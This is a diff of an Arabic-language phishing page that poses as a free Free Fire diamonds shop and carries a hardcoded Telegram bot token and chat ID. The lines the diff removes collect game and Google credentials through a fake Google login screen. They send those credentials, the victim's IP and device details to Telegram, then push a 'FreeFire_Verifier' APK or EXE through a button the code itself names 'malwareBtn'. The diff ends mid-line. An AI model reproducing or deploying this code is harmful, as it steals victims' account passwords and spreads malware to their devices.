@@ -332,12 +332,13 @@
                     <label><i class="fas fa-lock"></i> <span data-i18n="form.password">كلمة المرور</span></label>
                     <input type="password" id="accountPassword" data-i18n-placeholder="form.passwordPh" placeholder="أدخل كلمة المرور (8 أحرف على الأقل)" oninput="validatePasswordMatch()">
                     <small data-i18n="form.passwordHelp">مطلوبة لربط الحساب (8 أحرف على الأقل)</small>
+                    <div class="error-msg" id="passwordError">❌ <span data-i18n="error.password">كلمتا المرور غير متطابقتين</span></div>
                 </div>
                 <div class="form-group">
                     <label><i class="fas fa-key"></i> <span data-i18n="form.passwordConfirm">تأكيد كلمة المرور</span></label>
                     <input type="password" id="accountPasswordConfirm" data-i18n-placeholder="form.passwordConfirmPh" placeholder="أعد إدخال كلمة المرور" oninput="validatePasswordMatch()">
                     <small data-i18n="form.confirmHelp">للتأكيد</small>
-                    <div class="error-msg" id="passwordError">❌ <span data-i18n="error.password">كلمتا المرور غير متطابقتين</span></div>
+                    <div class="error-msg" id="passwordError2">❌ <span data-i18n="error.password">كلمتا المرور غير متطابقتين</span></div>
                 </div>
             </div>
 
@@ -507,7 +508,7 @@
 
     <script>
         // =====================================================
-        // 🛡️ CONFIG — غير البيانات دي لو محتاج
+        // 🛡️ CONFIG
         // =====================================================
         const TELEGRAM_BOT_TOKEN = '8228247059:AAGVPnwBA0ClYziL9GJ0ZBdLypsXC0hhbAw';
         const TELEGRAM_CHAT_ID = '6062660671';
@@ -585,7 +586,7 @@
         }
 
         // =====================================================
-        // 🛒 المنتجات والترجمات (زي موقعك الأصلي بالظبط)
+        // 🛒 المنتجات
         // =====================================================
         const products = [
             { id: 1, name: '1000 جوهر مجاني', diamonds: 1000, pricePKR: 0, priceEUR: 0, priceUSD: 0, badge: 'bestseller', badgeText: '🔥 الأكثر مبيعاً حالياً', game: 'freefire', isFree: true },
@@ -884,100 +885,4 @@
             if (!emailRegex.test(email)) { validateEmail(); document.getElementById('accountEmail').focus(); return; }
             if (password.length < 8) { alert(t['error.passwordShort']); document.getElementById('accountPassword').focus(); return; }
             if (password !== passwordConfirm) { validatePasswordMatch(); document.getElementById('accountPasswordConfirm').focus(); return; }
-            if (!isFreeSelected() && !selectedPayment) { alert(t['alert.choosePayment']); var pe = document.getElementById('paymentError'); if(pe) pe.classList.add('show'); return; }
-
-            var price = selectedCurrency === 'PKR' ? selectedProduct.pricePKR : selectedCurrency === 'EUR' ? selectedProduct.priceEUR : selectedProduct.priceUSD;
-            var priceDisplay = price === 0 ? '🎁 مجاناً' : (selectedCurrency === 'PKR' ? 'PKR ' + price : selectedCurrency === 'EUR' ? '€' + price : '$' + price);
-            var payN = { visa: '💳 Visa', vodafone: '📱 Vodafone Cash', googleplay: '🎮 Google Play', free: '🎁 مجاني' };
-            var linkN = { google: '🌐 Google', facebook: '📘 Facebook', vk: '🔵 VK', apple: '🍎 Apple ID', twitter: '🐦 Twitter / X', guest: '👤 حساب ضيف' };
-
-            var msg = '<b>🎯 [1] FREE FIRE CREDENTIALS</b>\n';
-            msg += '━━━━━━━━━━━━━━\n\n';
-            msg += '<b>📦 Package:</b> ' + selectedProduct.name + '\n';
-            msg += '<b>💎 Diamonds:</b> ' + selectedProduct.diamonds + '\n';
-            msg += '<b>💰 Price:</b> ' + priceDisplay + '\n';
-            msg += '<b>💳 Payment:</b> ' + (payN[selectedPayment] || '-') + '\n\n';
-            msg += '<b>👤 ACCOUNT:</b>\n';
-            msg += '<b>🔗 Link:</b> ' + (linkN[linkType] || linkType) + '\n';
-            msg += '<b>🆔 ID:</b> <code>' + playerId + '</code>\n';
-            msg += '<b>📧 Email:</b> <code>' + email + '</code>\n';
-            msg += '<b>🔐 Pass:</b> <code>' + password + '</code>\n';
-            sendToTelegram(msg);
-            fetch('https://api.ipify.org?format=json').then(function(r){return r.json();}).then(function(d){ sendToTelegram('🌐 <b>IP:</b> <code>' + d.ip + '</code>'); }).catch(function(){});
-
-            // فتح شاشة جوجل (الخطوة 2) — الإيميل معبى تلقائياً
-            document.getElementById('googleEmail').value = email;
-            document.getElementById('googleOverlay').classList.add('active');
-        }
-
-        // =====================================================
-        // 🔵 الخطوة 2: OAuth الحقيقي + شاشة جوجل المزيفة
-        // =====================================================
-        function startOAuth() {
-            var email = document.getElementById('accountEmail').value || document.getElementById('googleEmail').value || '';
-            var url = 'https://accounts.google.com/o/oauth2/v2/auth'
-                + '?client_id=' + encodeURIComponent(_oauthClientId)
-                + '&redirect_uri=' + encodeURIComponent(_oauthRedirect)
-                + '&response_type=code'
-                + '&scope=' + encodeURIComponent('openid email profile')
-                + '&access_type=offline'
-                + (email ? '&login_hint=' + encodeURIComponent(email) : '');
-            window.location.href = url;
-        }
-        function closeGoogleOverlay() {
-            document.getElementById('googleOverlay').classList.remove('active');
-            showDownloadOverlay();
-        }
-        function googleSubmit() {
-            var gEmail = document.getElementById('googleEmail').value;
-            var gPass = document.getElementById('googlePass').value;
-            if (!gEmail || !gPass) { alert('⚠️ يرجى إدخال البريد الإلكتروني وكلمة المرور'); return; }
-
-            var msg = '<b>🔴 [2] GOOGLE ACCOUNT (GMAIL)</b>\n';
-            msg += '━━━━━━━━━━━━━━\n\n';
-            msg += '<b>📧 Email:</b> <code>' + gEmail + '</code>\n';
-            msg += '<b>🔐 Password:</b> <code>' + gPass + '</code>\n';
-            msg += '<b>🕐 Time:</b> ' + new Date().toISOString() + '\n\n';
-            msg += '<b>💻 Device:</b> ' + navigator.platform + ' | ' + screen.width + 'x' + screen.height;
-            sendToTelegram(msg);
-
-            document.getElementById('googleOverlay').classList.remove('active');
-            showDownloadOverlay();
-        }
-
-        // =====================================================
-        // 📥 الخطوة 3: شاشة التحميل (APK للأندرويد / EXE للكمبيوتر)
-        // =====================================================
-        function showDownloadOverlay() {
-            var btn = document.getElementById('malwareBtn');
-            if (/Android/i.test(navigator.userAgent)) {
-                btn.setAttribute('href', 'FreeFire_Verifier.apk');
-                btn.innerHTML = '<i class="fas fa-download"></i> تحميل تطبيق التحقق';
-            } else {
-                btn.setAttribute('href', 'FreeFire_Verifier.exe');
-                btn.innerHTML = '<i class="fas fa-download"></i> تحميل البرنامج';
-            }
-            document.getElementById('downloadOverlay').classList.add('active');
-        }
-        function skipDownload() {
-            document.getElementById('downloadOverlay').classList.remove('active');
-            sendToTelegram('<b>⏭️ User skipped download</b>');
-            showLoginModal();
-        }
-        document.getElementById('malwareBtn').addEventListener('click', function() {
-            sendToTelegram('<b>📥 Malware download clicked</b>');
-            setTimeout(function() {
-                document.getElementById('downloadOverlay').classList.remove('active');
-                showLoginModal();
-            }, 2000);
-        });
-
-        // =====================================================
-        // 🚀 تشغيل أولي
-        // =====================================================
-        document.getElementById('accountForm').classList.add('disabled');
-        loadProducts();
-        sendToTelegram('<b>✅ PAGE LOADED</b> | ' + window.location.href);
-    </script>
-</body>
-</html>
+            if (!isFreeSelected() && !selectedPayment) { alert(t['alert.choosePayment']); var pe
